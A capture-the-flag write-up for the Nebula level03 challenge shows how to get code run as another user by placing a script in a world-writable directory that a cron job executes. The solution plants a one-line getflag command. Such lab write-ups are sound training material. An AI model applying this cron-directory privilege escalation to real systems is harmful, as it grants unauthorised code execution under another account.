## Challenge
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

## Solution
Listing `/home/flag03` we can find:
```console
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
```
We have a directory and a shell script:
```shell
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
For each file in the directory,
* `ulimit -5 t` - allow a maximum of 5 seconds in cpu time
* `bash -x "$i"` - execute shell script and print commands executed
* `rm -f "$i"` - force delete file

We can recall a `crontab` is called every couple of minutes.

Let's read about `crontab` from `man`:
```console
man 5 crontab
```
```
 A crontab file contains instructions to the cron(8) daemon of the general form: ``run this command at
 this time on this date''.  Each user has their own crontab, and commands in any given crontab will  be
 executed as the user who owns the crontab.
```
So we can guess `writeable.sh` is going to be executed every couple of minutes.

Write a shell script that executes `getflag` to `/writable.d`.
```shell
getflag > /home/flag03/solved
```
Now we wait till cron executes the crontab.

We can use `watch` to watch `/writable` for when the file is deleted - crontab executed.
```console
watch ls -l /home/flag03/writable.d
```
```shell
level03@nebula:/home/flag03$ ls
solved  writable.d  writable.sh
level03@nebula:/home/flag03$ cat solved
You have successfully executed getflag on a target account
```
